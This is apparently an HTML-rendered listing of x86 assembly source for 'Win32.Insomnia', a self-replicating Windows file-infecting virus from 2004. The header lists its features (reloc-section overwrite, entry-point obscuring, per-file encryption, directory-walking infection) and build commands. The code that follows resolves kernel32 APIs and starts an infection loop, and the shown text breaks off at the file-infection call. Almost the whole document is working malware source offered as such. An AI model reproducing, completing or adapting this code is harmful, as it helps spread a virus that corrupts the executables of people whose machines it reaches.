<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>insomnia.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;   Win32.Insomnia (c) DR-EF.</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;virus name:Win32.Insomnia</span><span class="sc0">
</span><span class="sc1">;virus author:DR-EF</span><span class="sc0">
</span><span class="sc1">;virus size:1972 bytes</span><span class="sc0">
</span><span class="sc1">;features:</span><span class="sc0">
</span><span class="sc1">;   o dont increase file size,overwrite reloc </span><span class="sc0">
</span><span class="sc1">;     section instead.</span><span class="sc0">
</span><span class="sc1">;   o use EPO - replace all mov eax,fs:[00000000]</span><span class="sc0">
</span><span class="sc1">;     instructions with call virus decryptor.</span><span class="sc0">
</span><span class="sc1">;   o encrypted with new key for each file.</span><span class="sc0">
</span><span class="sc1">;   o use the dotdot method to find files.</span><span class="sc0">
</span><span class="sc1">;payload:messagebox with this text:</span><span class="sc0">
</span><span class="sc1">;   ".:[Win32.Insomnia © 2004 DR-EF]:."</span><span class="sc0">
</span><span class="sc1">;   every year at 29/12.</span><span class="sc0">
</span><span class="sc1">;compile:</span><span class="sc0">
</span><span class="sc1">;   tasm32 /m3 /ml /zi Insomnia.asm , , ;</span><span class="sc0">
</span><span class="sc1">;   tlink32 /tpe /aa /v Insomnia , Insomnia,,import32.lib</span><span class="sc0">
</span><span class="sc1">;   pewrsec Insomnia.exe</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">virus_size</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">EndVirus</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000080h</span><span class="sc0">
    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
    </span><span class="sc5">GENERIC_READ</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">virus_start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Delta</span><span class="sc0">
</span><span class="sc5">Delta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumberOfKernelBases</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">KernelBaseTable</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@next_k</span><span class="sc4">:</span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetKernel32Base</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">GetApis</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@next_k</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">reth</span><span class="sc0">    </span><span class="sc1">;return to host</span><span class="sc0">
</span><span class="sc5">KernelBaseTable</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">804d4000h</span><span class="sc0">   </span><span class="sc1">;winXP</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0bff60000h</span><span class="sc0">  </span><span class="sc1">;winME</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">77f00000h</span><span class="sc0">   </span><span class="sc1">;winNT</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">77e70000h</span><span class="sc0">   </span><span class="sc1">;win2K</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0bff70000h</span><span class="sc0">  </span><span class="sc1">;win9X</span><span class="sc0">
    </span><span class="sc5">NumberOfKernelBases</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5h</span><span class="sc0">
    
</span><span class="sc5">GetApis</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;eax - kernel32 export table</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;edi - api names array</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">nxt_cmp</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GetProcAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">search_address</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">nxt_l</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">nxt_cmp</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">nxt_l</span><span class="sc0">
</span><span class="sc5">search_address</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc1">;eax - kernel32 export table</span><span class="sc0">
    </span><span class="sc1">;edx - GetProcAddress position</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumberOfApis</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ApiNamesTable</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ApiAddressTable</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">nxt_api</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">api_err</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">nxt_al</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nxt_al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">nxt_api</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">InfectFiles</span><span class="sc0">
</span><span class="sc5">api_err</span><span class="sc4">:</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">reth</span><span class="sc0">
    
    </span><span class="sc5">_GetProcAddress</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">GetProcAddress</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">kernel32base</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    
</span><span class="sc5">ApiNamesTable</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">_FindFirstFile</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_FindNextFile</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"FindNextFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_GetCurrentDirectory</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_SetCurrentDirectory</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_CreateFile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_CloseHandle</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_CreateFileMapping</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileMappingA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_MapViewOfFile</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"MapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_UnmapViewOfFile</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"UnmapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_GetLocalTime</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetLocalTime"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_LoadLibrary</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"LoadLibraryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_SetFileTime</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SetFileTime"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    
</span><span class="sc5">ApiAddressTable</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">FindFirstFile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">FindNextFile</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">GetCurrentDirectory</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">SetCurrentDirectory</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">CreateFile</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">CloseHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">CreateFileMapping</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">MapViewOfFile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">UnmapViewOfFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">GetLocalTime</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">LoadLibrary</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">SetFileTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    
    </span><span class="sc5">NumberOfApis</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
    
</span><span class="sc5">GetKernel32Base</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">k32err</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">_k32err</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">_k32err</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">_k32err</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">k32err</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">VirusCopyRight</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">".:[Win32.Insomnia © 2004 DR-EF]:."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">InfectFiles</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">max_dirs</span><span class="sc4">],</span><span class="sc2">0fh</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cdir</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ReturnToHost</span><span class="sc0">
</span><span class="sc5">s_files</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">max_dirs</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">r_dir</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">search_mask</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindFirstFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">nxt_dir</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfind</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">i_file</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFile</span><span class="sc0">
